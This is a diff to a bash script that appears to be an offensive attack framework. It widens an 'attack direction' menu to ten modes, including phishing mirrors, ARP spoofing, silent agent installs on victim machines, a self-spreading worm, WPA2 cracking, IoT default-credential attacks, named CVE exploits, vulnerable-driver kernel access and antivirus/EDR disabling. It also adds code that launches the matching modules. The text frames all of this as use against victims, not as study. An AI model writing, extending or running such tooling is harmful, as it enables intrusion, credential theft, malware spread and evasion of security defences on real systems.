@@ -1231,22 +1231,42 @@ choose_direction() {
     banner
     step 1 "CHOOSE ATTACK DIRECTION"
     echo ""
-    info "Remote   — send a link, victim visits a mirrored site"
-    info "Physical — same WiFi/LAN, intercept traffic directly"
-    info "Payload  — send a file or link, agent installs silently on their machine"
-    info "Worm     — file hides on device, persists on reboot, spreads to every USB/SD"
+    echo -e "  ${Y}── Credential & Traffic Attacks ──────────────────────────────${N}"
+    info "[1] Remote      — send a link, victim visits a mirrored/phishing site"
+    info "[2] Physical    — same WiFi/LAN, intercept + inject traffic (ARP spoof)"
     echo ""
-    choose "Which direction?" \
-        "Remote   (send a link — mirrors target site)" \
-        "Physical (same network — ARP spoof)" \
-        "Payload  (send a file/link — agent installs on victim machine)" \
-        "Worm     (file-based — hides, persists, auto-spreads via USB/SD/email)"
+    echo -e "  ${Y}── Agent Deployment ──────────────────────────────────────────${N}"
+    info "[3] Payload     — send file/link, silent agent installs on victim machine"
+    info "[4] Worm        — self-spreading agent, persists on reboot, USB/SSH/email"
+    echo ""
+    echo -e "  ${Y}── Wireless Attacks ──────────────────────────────────────────${N}"
+    info "[5] WiFi        — WPA2 crack (PMKID/handshake), deauth, evil twin AP"
+    echo ""
+    echo -e "  ${Y}── Network & Device Attacks ──────────────────────────────────${N}"
+    info "[6] IoT         — cameras, smart home, MQTT, Modbus, ROS, default creds"
+    info "[7] CVE Exploit — 11 CVEs: Log4Shell, ZeroLogon, Follina, EternalBlue..."
+    echo ""
+    echo -e "  ${Y}── Windows Privilege Escalation ──────────────────────────────${N}"
+    info "[8] BYOVD       — kernel R/W via vulnerable signed driver (fully patched)"
+    info "[9] Defender    — 6-layer EDR/AV elimination (BYOVD + tamper + ETW blind)"
+    echo ""
+    echo -e "  ${Y}── Zero-Interaction Compromise ───────────────────────────────${N}"
+    info "[0] Zero-Click  — IPv6 RA, WPAD/NTLMv1, SMB relay, mDNS poison, DCOM"
+    echo ""
+
+    read -rp "  Which direction? [0-9]: " CHOICE
 
     case "$CHOICE" in
-        1) DIRECTION="remote";   ok "Remote mode selected" ;;
-        2) DIRECTION="physical"; ok "Physical mode selected" ;;
-        3) DIRECTION="payload";  ok "Payload mode selected" ;;
-        4) DIRECTION="worm";     ok "Worm mode selected" ;;
+        1) DIRECTION="remote";    ok "Remote mode selected" ;;
+        2) DIRECTION="physical";  ok "Physical mode selected" ;;
+        3) DIRECTION="payload";   ok "Payload mode selected" ;;
+        4) DIRECTION="worm";      ok "Worm mode selected" ;;
+        5) DIRECTION="wifi";      ok "WiFi attack mode selected" ;;
+        6) DIRECTION="iot";       ok "IoT attack mode selected" ;;
+        7) DIRECTION="exploit";   ok "CVE exploit mode selected" ;;
+        8) DIRECTION="byovd";     ok "BYOVD mode selected" ;;
+        9) DIRECTION="defender";  ok "Defender kill mode selected" ;;
+        0) DIRECTION="zeroclick"; ok "Zero-click mode selected" ;;
         *) warn "Invalid — defaulting to Remote"; DIRECTION="remote" ;;
     esac
     log "Direction: $DIRECTION"
@@ -6581,6 +6601,16 @@ main() {
 
     # Step 1 — Direction
     choose_direction
+
+    # New standalone modules — skip weapon/configure steps, go direct
+    case "$DIRECTION" in
+        wifi)      cmd_wifi;      return ;;
+        iot)       cmd_iot;       return ;;
+        exploit)   cmd_exploit;   return ;;
+        byovd)     init_files; python3 "$DIR/op/modules/byovd.py" 2>&1; return ;;
+        defender)  init_files; python3 "$DIR/op/modules/defender_kill.py" 2>&1; return ;;
+        zeroclick) cmd_zeroclick; return ;;
+    esac
 
     # Step 2 — Weapon (worm has its own delivery menu, skip here)
     [ "$DIRECTION" != "worm" ] && choose_weapon
